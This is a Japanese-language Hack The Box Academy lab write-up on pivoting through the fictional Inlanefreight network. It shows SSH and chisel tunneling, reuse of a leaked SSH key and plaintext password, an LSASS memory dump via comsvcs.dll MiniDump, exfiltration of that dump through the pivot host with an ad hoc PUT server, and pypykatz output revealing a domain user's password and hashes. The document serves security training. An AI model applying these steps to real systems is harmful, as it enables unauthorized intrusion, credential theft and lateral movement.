---
{"dg-publish":true,"permalink":"/hack-the-box-academy/pivoting-tunneling-and-port-forwarding-skills-assessment/","noteIcon":""}
---

![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)

チームメンバーがInlanefreight環境に対する侵入テストを開始しましたが、土壇場で別のプロジェクトに移動されました。私たちにとって幸運なことに、彼らは私たちがネットワークに戻るための`web shell`を所定の位置に残したので、彼らが中断したところから取り上げることができます。ウェブシェルを活用して、ホストの列挙を継続し、共通サービスを特定し、それらのサービス/プロトコルを使用してInlanefreightの内部ネットワークにピボットする必要があります。私たちの詳細な目標は以下の`below`。

---

## 目的

- 外部（`Pwnbox or your own VM`）から起動し、所定の位置に残されたWebシェルを介して最初のシステムにアクセスします。
- Webシェルアクセスを使用して、内部ホストを列挙してピボットします。
- `Inlanefreight Domain Controller`に到達し、関連する`flag`をキャプチャするまで、列挙とピボットを続けます。
- 環境内の`data`、`credentials`、`scripts`、またはその他の情報を使用して、ピボットの試行を有効にします。
- 見つけられる旗`any/all`つかんでください。
---

`http://10.129.229.129/`にwebshellが用意されていて、このマシンをピボットホストとして使うのかなと思う
![](https://i.imgur.com/94YwX0n.png)

まず、このホストのNICを列挙する
このホストの外部IPが`10.129.229.129`なので、`172.16.5.15`が内部ネットワークでこのホストに割り当てられてるIP何だと思う
```sh
www-data@inlanefreight.local:…/www/html# ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.229.129  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb0:9425  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:9425  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:94:25  txqueuelen 1000  (Ethernet)
        RX packets 4872  bytes 431621 (431.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 454  bytes 38910 (38.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.15  netmask 255.255.0.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb0:93f  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:09:3f  txqueuelen 1000  (Ethernet)
        RX packets 353  bytes 22715 (22.7 KB)
        RX errors 0  dropped 13  overruns 0  frame 0
        TX packets 21  bytes 1726 (1.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1513  bytes 119183 (119.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1513  bytes 119183 (119.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

まず、このホストの管理者権限欲しいよね
webadminというユーザーがいるらしい
```sh
webadmin:x:1001:1001:,,,:/home/webadmin:/bin/bash
administrator:x:1002:1002:,,,:/home/administrator:/bin/bash
```

/home/webadminを見に行くとこんなファイルある
```sh
www-data@inlanefreight.local:/home/webadmin# ls -la
total 40
drwxr-xr-x 4 webadmin webadmin 4096 Feb 21  2024 .
drwxr-xr-x 4 root     root     4096 Feb 21  2024 ..
-rw------- 1 webadmin webadmin 1372 Feb 21  2024 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 May  6  2022 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 May  6  2022 .bashrc
drwx------ 2 webadmin webadmin 4096 Feb 21  2024 .cache
-rw-r--r-- 1 webadmin webadmin  807 May  6  2022 .profile
drwx--x--x 2 webadmin webadmin 4096 Feb 21  2024 .ssh
-rw-r--r-- 1 root     root      163 May 16  2022 for-admin-eyes-only
-rw-r--r-- 1 root     root     2622 May 16  2022 id_rsa
```

id_rsaとなんか意味深なファイルある
```sh
www-data@inlanefreight.local:/home/webadmin# cat for-admin-eyes-only
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```

翻訳するとこんな感じ
```sh
自分用のメモ
このマシンから `server01` や同じサブネット内の他のサーバーにアクセスするには、
ユーザーアカウント: `mlefay` を使用する必要がある。
パスワードは：
Plain Human work!
```

とりあえず認証情報が見つかったけど、そもそもこの172の内部ネットワークにの中にどんなサーバーがあるのかがわかってないので調べる
でもまず、www-dataのままでは、権限昇格できないし、ピボットホストとして使うために、上で見つけたid_rsaをもとに、webadminとしてログインする
Attack Hostで以下を実行
```sh
nano id_rsa #上のssh private keyをコピペ
chmod 600 id_rsa
ssh -i id_rsa webadmin@10.129.229.129
```

すると、webadminとしてログインできる
```sh
webadmin@inlanefreight:~$ 
```

とりあえず、これでAttack Hostのターミナルとwebサーバーの間で通信できてるので(？)
sshのダイナミックぽートフォワーディングで、webサーバーの内部ネットワークの中のサーバーを列挙できる

ダイナミックポートフォワーディングの準備
```sh
sudo apt-get install sshuttle
```

```sh
sudo sshuttle --ssh-cmd "ssh -i id_rsa" -r webadmin@10.129.229.129 172.16.5.0/24 -v
```

webサーバーのホストが、`172.16.5.15`
	•	自分のIP: 172.16.5.15
	•	ネットマスク: 255.255.0.0（= /16）
	•	内部ネットワーク範囲: 172.16.0.0/16（172.16.0.1 ～ 172.16.255.254）

内部ネットワーク範囲が生きているか死んでいるかを見極める
```sh
webadmin@inlanefreight:~$ for ip in 172.16.5.{1..254}; do ping -c 1 -W 2 $ip > /dev/null 2>&1 && echo "$ip is up" || echo "$ip is down"  
done
```

出力
```sh
172.16.5.1 is down
...
172.16.5.14 is down
172.16.5.15 is up
172.16.5.16 is down
172.16.5.17 is down
...
172.16.5.33 is down
172.16.5.34 is down
172.16.5.35 is up
```

この出力から、`172.16.5.15`(webサーバー)の他に`172.16.5.35`も空いていることがわかる。
先ほどの認証情報を使い、`172.16.5.15`をピボットホストとして使って、`172.16.5.35`にアクセスする。
`

`172.16.5.35`上のサービス・空いているポートを列挙する
chiselを使う

```sh
┌─[us-academy-2]─[10.10.15.221]─[htb-ac-1632385@htb-19d2grbumx]─[~]
└──╼ [★]$ ./chisel client -v 10.129.50.3:1234 socks
webadmin@inlanefreight:~$ ./chisel server -v -p 1234 --socks5

```

自分の環境だとnmapが全部filteredになっちゃう(-rも試したが)ので、ncでチェックすると、sshとrdpが動いていることがわかった。
```sh
└──╼ [★]$ proxychains nc 172.16.5.35 22
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.5.35:22  ...  OK
SSH-2.0-OpenSSH_for_Windows_8.9

```

rdpでログインしてみる
```sh
└──╼ [★]$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```
ログインできた
![](https://i.imgur.com/2lntQSa.png)

1つ目のflagあった。
また、mlefayのアカウントは、管理者権限のようで、Powershellを管理者権限で立ち上げられた。
![](https://i.imgur.com/mHb7Vtf.png)

管理者権限でアクセスできたので、LSASSへの攻撃を行い、横展開できるユーザーがいないかを調べる

# LSASSへの攻撃
PowerShell
```powershell-session
PS C:\Windows\system32> Get-Process lsass
```

 LSASSプロセスにPIDを割り当てたら、ダンプファイルを作成できる
 - `rundll32.exe`を実行して`comsvcs.dll`のエクスポートされた関数を呼び出す
	 - MiniDumpWriteDump（`MiniDump`）関数も呼び出して、LSASSプロセスメモリを指定されたディレクトリ（`C:\lsass.dmp`）にダンプする
PowerShell
```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <上で調べたId> C:\lsass.dmp full
```

ダンプできたファイルは、攻撃元に送る
- 問題点
	- ピボットホストを介してでしかAttackHostに送れない
	- ピボットホストはインターネット接続と管理者権限ないので、pip installとかができない
		- インターネット接続があれば`pip3 install uploadserver`と`python3 -m uploadserver`でアップロードを受け取れる
- 解決策
	- ピボットホストがPUTを受け取れるpythonを書いて、実行する

ピボットホスト
- ピボットホストがPUTを受け取れるpythonを書いて、実行する
```sh
cat <<EOF > upload_server.py
#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer

class UploadHandler(SimpleHTTPRequestHandler):
    def do_PUT(self):
        path = self.translate_path(self.path)
        length = int(self.headers['Content-Length'])
        with open(path, 'wb') as output:
            output.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()

server_address = ('0.0.0.0', 8080)
httpd = HTTPServer(server_address, UploadHandler)
print("Serving HTTP on port 8080... Accepting PUT requests")
httpd.serve_forever()
EOF
```

```sh
python3 upload_server.py
```

`172.16.5.35`でのPowerShell
lsass.dmpをピボットホストにアップロードする
```ps
 Invoke-WebRequest -Uri "http://172.16.5.15:8080/lsass.dmp" -Method Put -InFile "C:\lsass.dmp"
```


## ピボットホストからAttack Hostへのlsass.dmpの転送

ピボットホスト
```sh
webadmin@inlanefreight:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.15.221 - - [19/Mar/2025 08:18:29] "GET /lsass.dmp HTTP/1.1" 200 -
```

Attack Host
```sh
wget http://10.129.50.3:8080/lsass.dmp
```

## Pypykatzを使用して資格情報を抽出する
特に興味深いのは、vfrank
パスワードが平文で保存されてる

認証情報
vfrank : Imply wet Unmasked!
```sh
└──╼ [★]$ pypykatz lsa minidump lsass.dmp
INFO:pypykatz:Parsing file lsass.dmp
FILE: ======== lsass.dmp =======
username mlefay
domainname PIVOT-SRV01
logon_server PIVOT-SRV01
logon_time 2025-03-19T11:22:19.208141+00:00
sid S-1-5-21-1602415334-2376822715-119304339-1003

luid 2268367
...
== LogonSession ==
authentication_id 162427 (27a7b)
session_id 0
username vfrank
domainname INLANEFREIGHT
logon_server ACADEMY-PIVOT-D
logon_time 2025-03-19T09:51:39.208151+00:00
sid S-1-5-21-3858284412-1730064152-742000644-1103
luid 162427
	== MSV ==
		Username: vfrank
		Domain: INLANEFREIGHT
		LM: NA
		NT: 2e16a00be74fa0bf862b4256d0347e83
		SHA1: b055c7614a5520ea0fc1184ac02c88096e447e0b
		DPAPI: 97ead6d940822b2c57b18885ffcc5fb400000000
	== WDIGEST [27a7b]==
		username vfrank
		domainname INLANEFREIGHT
		password None
		password (hex)
	== Kerberos ==
		Username: vfrank
		Domain: INLANEFREIGHT.LOCAL
		Password: Imply wet Unmasked!
		password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
	== WDIGEST [27a7b]==
		username vfrank
		domainname INLANEFREIGHT
		password None
		password (hex)
	== DPAPI [27a7b]==
		luid 162427
		key_guid 560f4286-76f2-4f0f-90a9-5135bbc0104f
		masterkey 4fc3adb204f30f6a226f637b66be93811cee121eaed0e4ec2e8bc023d2d38d396e0c4e827aa49c6b1c2a58f6428ca725be027497ad10f8dd386d5926e7bf73b7
		sha1_masterkey a3e3a61d9a74541a56c3a822d5470bedbb2d4fb5

== LogonSession ==
...

```

横展開したい
システムの情報を見てみる
```ps
PS C:\Windows\system32> systeminfo

Host Name:                 PIVOT-SRV01
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA277
Original Install Date:     5/6/2022, 1:19:26 AM
System Boot Time:          3/19/2025, 4:51:04 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24224532.B64.2408191458, 8/19/2024
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-06:00) Central Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,537 MB
Virtual Memory: Max Size:  5,061 MB
Virtual Memory: Available: 3,163 MB
Virtual Memory: In Use:    1,898 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    INLANEFREIGHT.LOCAL
Logon Server:              \\PIVOT-SRV01
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB5009472
                           [02]: KB4535680
                           [03]: KB4589208
                           [04]: KB5010427
                           [05]: KB5009642
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.5.35
                                 [02]: fe80::9107:fb0b:327a:e500
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.6.35
                                 [02]: fe80::6043:93b9:17b9:2f42
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

2つのNICがある。

1つは、`172.16.5.35`で、2つ目は`172.16.6.35`である。
`172.16.6.35`の内部ネットワークは調べてないので、こっちの方で新しいマシンが見つかるかもしれない。

内部ネットワーク範囲の中のホストが生きているのか死んでいるのかを見極めるコマンドのPowerShell版
```sh
1..254 | ForEach-Object {
    if (Test-Connection -ComputerName "172.16.6.$_" -Count 1 -Quiet) {
        Write-Output "172.16.6.$_ is up"
    } else {
        Write-Output "172.16.6.$_ is down"
    }
}
```

何でmlefayのアカウントで同じコマンド打っても`172.16.6.35`以外全部downだったのにvfrankだと出てくるのか謎。（後で調べる
```sh
172.16.6.22 is down
172.16.6.23 is down
172.16.6.24 is down
172.16.6.25 is up
172.16.6.26 is down
172.16.6.27 is down
172.16.6.28 is down
172.16.6.29 is down
172.16.6.30 is down
172.16.6.31 is down
172.16.6.32 is down
172.16.6.33 is down
172.16.6.34 is down
172.16.6.35 is up
172.16.6.36 is down
172.16.6.37 is down
172.16.6.38 is down
172.16.6.39 is down
172.16.6.40 is down
172.16.6.41 is down
172.16.6.42 is down
172.16.6.43 is down
172.16.6.44 is down
172.16.6.45 is up
172.16.6.46 is down
172.16.6.47 is down
172.16.6.48 is down
172.16.6.49 is down
172.16.6.50 is down
172.16.6.51 is down
```

`172.16.6.X`の中で生きているホストを見つけたので、ダブルピボット・ダブルRDPして、`172.16.6.25`に接続する。
上のvfrankの認証情報を利用して、ログインすると、`C:\flag.txt`が見つかる
![](https://i.imgur.com/7fVmHk7.png)

AdminDCの共有フォルダが見つかったので、そこにアクセスすると、最後のflagが見つかる。
![](https://i.imgur.com/Rbp6IrM.png)


